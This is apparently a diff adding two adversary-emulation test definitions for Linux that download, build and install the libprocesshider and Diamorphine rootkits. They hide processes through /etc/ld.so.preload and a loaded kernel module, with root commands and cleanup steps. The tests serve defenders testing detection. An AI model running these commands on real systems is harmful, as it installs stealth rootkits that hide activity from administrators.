@@ -86,3 +86,92 @@ atomic_tests:
       sudo depmod -a
     name: sh
     elevation_required: true
+- name: dynamic-linker based rootkit (libprocesshider)
+  auto_generated_guid: 1338bf0c-fd0c-48c0-9e65-329f18e2c0d3
+  description: |
+    Uses libprocesshider to simulate rootkit behavior by hiding a specific process name via ls.so.preload (see also T1574.006).
+  supported_platforms:
+  - linux
+  input_arguments:
+    repo:
+      description: Url of the github repo zip
+      type: String
+      default: https://github.com/gianlucaborello/libprocesshider/
+    rev:
+      description: Revision of the github repo zip
+      type: String
+      default: 25e0587d6bf2137f8792dc83242b6b0e5a72b415
+    library_path:
+      description: Full path of the library to add to ld.so.preload
+      type: String
+      default: /usr/local/lib/libprocesshider.so
+  dependency_executor_name: bash
+  dependencies:
+  - description: |
+      The preload library must exist on disk at specified location (#{library_path})
+    prereq_command: |
+      if [ -f #{library_path} ]; then exit 0; else exit 1; fi;
+    get_prereq_command: |
+      mkdir -p /tmp/atomic && cd /tmp/atomic
+      curl -sLO #{repo}/archive/#{rev}.zip && unzip #{rev}.zip && cd libprocesshider-#{rev}
+      make
+      cp libprocesshider.so #{library_path}
+      cp /usr/bin/ping /usr/local/bin/evil_script.py
+  executor:
+    command: |
+      echo #{library_path} | tee -a /etc/ld.so.preload
+      /usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo "process hidden"
+    cleanup_command: |
+      sed -i "\:^#{library_path}:d" /etc/ld.so.preload
+      rm -rf #{library_path} /usr/local/bin/evil_script.py /tmp/atomic
+    name: sh
+    elevation_required: true
+- name: Loadable Kernel Module based Rootkit (Diamorphine)
+  auto_generated_guid: 0b996469-48c6-46e2-8155-a17f8b6c2247
+  description: |
+    Loads Diamorphine kernel module, which hides itself and a processes.
+  supported_platforms:
+  - linux
+  input_arguments:
+    repo:
+      description: Url of the diamorphine github repo
+      type: String
+      default: https://github.com/m0nad/Diamorphine/
+    rev:
+      description: Revision of the github repo zip
+      type: String
+      default: 898810523aa2033f582a4a5903ffe453334044f9
+    rootkit_path:
+      description: Path To rootkit
+      type: String
+      default: /tmp/atomic/Diamorphine
+    rootkit_name:
+      description: Module name
+      type: String
+      default: diamorphine
+  dependency_executor_name: bash
+  dependencies:
+  - description: |
+      The kernel module must exist on disk at specified location (#{rootkit_path}/#{rootkit_name}.ko)
+    prereq_command: |
+      if [ -f /lib/modules/$(uname -r)/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;
+    get_prereq_command: |
+      mkdir -p /tmp/atomic && cd /tmp/atomic
+      curl -sLO #{repo}/archive/#{rev}.zip && unzip #{rev}.zip && cd Diamorphine-#{rev}
+      make
+      sudo cp #{rootkit_name}.ko /lib/modules/$(uname -r)/
+      sudo depmod -a
+  executor:
+    command: |
+      sudo modprobe #{rootkit_name}
+      ping -c 10 localhost >/dev/null & TARGETPID="$!"
+      ps $TARGETPID
+      kill -31 $TARGETPID
+      ps $TARGETPID || echo "process ${TARGETPID} hidden"
+    cleanup_command: |
+      kill -63 1
+      sudo modprobe -r #{rootkit_name}
+      sudo rm -rf /lib/modules/$(uname -r)/#{rootkit_name}.ko /tmp/atomic
+      sudo depmod -a
+    name: sh
+    elevation_required: true
